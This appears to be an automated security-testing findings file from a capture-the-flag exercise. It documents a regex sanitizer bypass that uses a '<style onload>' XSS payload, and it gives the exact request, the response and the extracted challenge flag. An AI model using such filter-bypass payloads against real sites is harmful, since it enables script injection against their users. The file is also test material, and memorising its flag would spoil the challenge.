@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T22:11:12.242928+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "83c04679-39b4-48d7-9c9b-c7ec563a8de0",
+      "timestamp": "2026-04-12T22:11:12.242853+00:00",
+      "title": "XSS Filter Bypass via <style onload> \u2014 CTF Flag Extracted",
+      "severity": "critical",
+      "target": "http://172.17.0.1:38891/page",
+      "description": "The application sanitizes user input with a regex-based filter that only strips tags NOT starting with '<style'. This allows injecting a full '<style>' element with arbitrary attributes including event handlers. The 'onload' event fires on <style> elements when the stylesheet is processed, executing arbitrary JavaScript. The filter strips '</style>' closing tags and all other HTML tags but preserves any opening tag matching '<style...'.",
+      "evidence": "Payload: <style onload=alert('XSS')>\nURL: http://172.17.0.1:38891/page?name=%3Cstyle+onload%3Dalert%28%27XSS%27%29%3E\nResponse (200): success_star.png shown, message: 'Congratulations! Here is the flag: flag{fcec3afc-4b74-433f-b638-14091e51092e}'\nFlag: flag{fcec3afc-4b74-433f-b638-14091e51092e}",
+      "tool_used": "http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET /page?name=%3Cstyle+onload%3Dalert%28%27XSS%27%29%3E HTTP/1.1\nHost: 172.17.0.1:38891",
+        "expected": "success_star.png + flag{fcec3afc-4b74-433f-b638-14091e51092e}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "f4a27452-84a1-457e-9f7e-b95aea1f3e8e",
+      "timestamp": "2026-04-12T22:11:19.671045+00:00",
+      "title": "XSS Challenge Architecture",
+      "mermaid": "graph TD\n    A[Attacker] -->|GET /page?name=PAYLOAD| B[Flask/Werkzeug 3.1.8]\n    B -->|Regex sanitizer: keep tags starting with style| C{Sanitizer}\n    C -->|Stripped input| D[Template Render]\n    D -->|Reflected HTML with style onload event| E[Response]\n    E -->|alert XSS fires via onload| F[Flag Returned]\n    F --> G[flag{fcec3afc-4b74-433f-b638-14091e51092e}]"
+    }
+  ]
+}
